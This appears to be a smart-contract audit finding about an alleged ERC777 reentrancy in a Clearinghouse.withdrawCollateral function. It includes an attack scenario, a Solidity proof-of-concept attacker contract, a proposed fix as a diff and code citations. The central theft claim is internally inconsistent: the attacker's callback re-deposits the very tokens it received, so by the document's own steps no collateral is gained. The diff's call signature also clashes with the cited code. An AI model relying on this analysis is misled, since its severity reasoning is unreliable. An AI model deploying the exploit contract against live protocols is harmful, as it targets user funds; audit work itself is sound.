### Title
Reentrancy via ERC777 Token Callback in `withdrawCollateral` Allows Balance Double-Counting — (File: `core/contracts/Clearinghouse.sol`)

---

### Summary

`Clearinghouse.withdrawCollateral` transfers tokens to the recipient **before** decrementing the sender's internal balance. If the collateral token implements a transfer callback (e.g., ERC777 `tokensReceived`), a recipient contract can re-enter the protocol during the transfer window, deposit the received tokens back, and exit with both the tokens and an unchanged internal balance — effectively stealing collateral from the protocol.

---

### Finding Description

In `Clearinghouse.withdrawCollateral`, the execution order is:

1. **Line 408** — `handleWithdrawTransfer(token, sendTo, amount)` — tokens are transferred out to `sendTo` via `WithdrawPool.submitWithdrawal` → `token.safeTransfer(sendTo, amount)`.
2. **Line 412** — `spotEngine.updateBalance(productId, sender, amountRealized)` — the sender's internal balance is decremented.
3. **Line 419** — `getHealth(sender, healthType) >= 0` — health check. [1](#0-0) 

The `handleWithdrawTransfer` internal function routes tokens first to `withdrawPool`, then calls `BaseWithdrawPool.submitWithdrawal`, which calls `token.safeTransfer(to, amount)` to deliver tokens to the final recipient. [2](#0-1) [3](#0-2) 

Between the token delivery (step 1) and the balance decrement (step 2), the protocol is in an **inconsistent state**: tokens have left the vault but the sender's subaccount balance still reflects the pre-withdrawal amount. Any re-entrant call during this window observes an inflated balance.

The `WithdrawCollateralV2` transaction type explicitly allows the caller to specify an arbitrary `sendTo` address, giving an attacker full control over the recipient contract. [4](#0-3) 

---

### Impact Explanation

**Attack scenario (ERC777 collateral token):**

1. Attacker deploys a malicious contract `M` that implements `tokensReceived`.
2. `M` pre-approves the `Endpoint` to spend the collateral token.
3. Attacker signs and submits a `WithdrawCollateralV2` transaction with `sendTo = address(M)` and `amount = A`. Sequencer includes it.
4. `withdrawCollateral` executes:
   - Tokens `A` are transferred to `M`. ERC777 `tokensReceived` fires.
   - Inside the callback, `M` calls `Endpoint.depositCollateralWithReferral(sender, productId, A, ...)`.
   - `clearinghouse.depositCollateral` credits the sender's balance: balance becomes `X + A`.
   - Callback returns.
   - `spotEngine.updateBalance(productId, sender, -A)` decrements balance: `X + A - A = X`.
   - Health check passes (balance unchanged at `X`).
5. **Net result**: Attacker's subaccount balance is `X` (unchanged), but `A` tokens have been extracted from the protocol's collateral pool with no net debit.

This corrupts the protocol's solvency invariant: the sum of all internal balances no longer matches the actual token holdings in the vault.

**Impact: High** — direct theft of collateral from the protocol.

---

### Likelihood Explanation

**Likelihood: Medium.**

- `WithdrawCollateralV2` is a supported, user-accessible transaction type that explicitly allows a custom `sendTo` address, making the attacker-controlled recipient a first-class feature.
- ERC777 tokens are a widely deployed standard. If any supported collateral token implements ERC777 (or any other transfer-hook mechanism), the attack is directly executable.
- The attacker only needs to submit a valid signed transaction through the normal sequencer path — no privileged access is required. [4](#0-3) 

---

### Recommendation

Apply the **checks-effects-interactions** pattern: decrement the internal balance **before** executing the external token transfer.

```diff
// Clearinghouse.sol: withdrawCollateral
-    handleWithdrawTransfer(token, sendTo, amount);
-
     int256 multiplier = int256(10**(MAX_DECIMALS - _decimals(productId)));
     int128 amountRealized = -int128(amount) * int128(multiplier);
     spotEngine.updateBalance(productId, sender, amountRealized);
     spotEngine.assertUtilization(productId);

     IProductEngine.HealthType healthType = sender == X_ACCOUNT
         ? IProductEngine.HealthType.PNL
         : IProductEngine.HealthType.INITIAL;

     require(getHealth(sender, healthType) >= 0, ERR_SUBACCT_HEALTH);
+
+    handleWithdrawTransfer(token, sendTo, amount);
     emit ModifyCollateral(amountRealized, sender, productId);
```

Additionally, consider adding a `nonReentrant` guard to `withdrawCollateral` as a defense-in-depth measure.

---

### Proof of Concept

```solidity
// Attacker's malicious recipient contract (ERC777 tokensReceived hook)
contract MaliciousRecipient is IERC777Recipient {
    IEndpoint endpoint;
    IERC20 token;
    bytes32 senderSubaccount;
    uint32 productId;

    constructor(address _endpoint, address _token, bytes32 _subaccount, uint32 _pid) {
        endpoint = IEndpoint(_endpoint);
        token = IERC20(_token);
        senderSubaccount = _subaccount;
        productId = _pid;
        // Pre-approve endpoint to pull tokens back
        token.approve(_endpoint, type(uint256).max);
    }

    // Called by ERC777 token during safeTransfer in WithdrawPool.handleWithdrawTransfer
    function tokensReceived(
        address, address, address, uint256 amount,
        bytes calldata, bytes calldata
    ) external override {
        // At this point: sender's subaccount balance is still X (not yet decremented)
        // Re-deposit the received tokens back to the same subaccount
        endpoint.depositCollateralWithReferral(
            senderSubaccount,
            productId,
            uint128(amount),
            ""
        );
        // Balance is now X + amount
        // After this callback returns, withdrawCollateral decrements by amount → X
        // Net: attacker has X balance AND received `amount` tokens for free
    }
}
```

**Expected outcome**: After the transaction, the attacker's subaccount balance is unchanged at `X`, but `amount` tokens have been extracted from the protocol's collateral pool, breaking the solvency invariant.

### Citations

**File:** core/contracts/Clearinghouse.sol (L377-385)
```text
    function handleWithdrawTransfer(
        IERC20Base token,
        address to,
        uint128 amount,
        uint64 idx
    ) internal virtual {
        token.safeTransfer(withdrawPool, uint256(amount));
        BaseWithdrawPool(withdrawPool).submitWithdrawal(token, to, amount, idx);
    }
```

**File:** core/contracts/Clearinghouse.sol (L408-419)
```text
        handleWithdrawTransfer(token, sendTo, amount, idx);

        int256 multiplier = int256(10**(MAX_DECIMALS - _decimals(productId)));
        int128 amountRealized = -int128(amount) * int128(multiplier);
        spotEngine.updateBalance(productId, sender, amountRealized);
        spotEngine.assertUtilization(productId);

        IProductEngine.HealthType healthType = sender == X_ACCOUNT
            ? IProductEngine.HealthType.PNL
            : IProductEngine.HealthType.INITIAL;

        require(getHealth(sender, healthType) >= 0, ERR_SUBACCT_HEALTH);
```

**File:** core/contracts/BaseWithdrawPool.sol (L184-190)
```text
    function handleWithdrawTransfer(
        IERC20Base token,
        address to,
        uint128 amount
    ) internal virtual {
        token.safeTransfer(to, uint256(amount));
    }
```

**File:** core/contracts/EndpointTx.sol (L437-465)
```text
        } else if (txType == IEndpoint.TransactionType.WithdrawCollateralV2) {
            IEndpoint.SignedWithdrawCollateralV2 memory signedTx = abi.decode(
                transaction[1:],
                (IEndpoint.SignedWithdrawCollateralV2)
            );
            validateSignedTx(
                signedTx.tx.sender,
                signedTx.tx.nonce,
                transaction,
                signedTx.signature,
                signedTx.tx.sendTo == address(0)
            );
            int128 currentFeeX18 = spotEngine
                .getConfig(signedTx.tx.productId)
                .withdrawFeeX18;
            require(signedTx.feeX18 >= 0);
            require(signedTx.feeX18 <= currentFeeX18);
            chargeFee(
                signedTx.tx.sender,
                signedTx.feeX18,
                signedTx.tx.productId
            );
            clearinghouse.withdrawCollateral(
                signedTx.tx.sender,
                signedTx.tx.productId,
                signedTx.tx.amount,
                signedTx.tx.sendTo,
                nSubmissions
            );
```
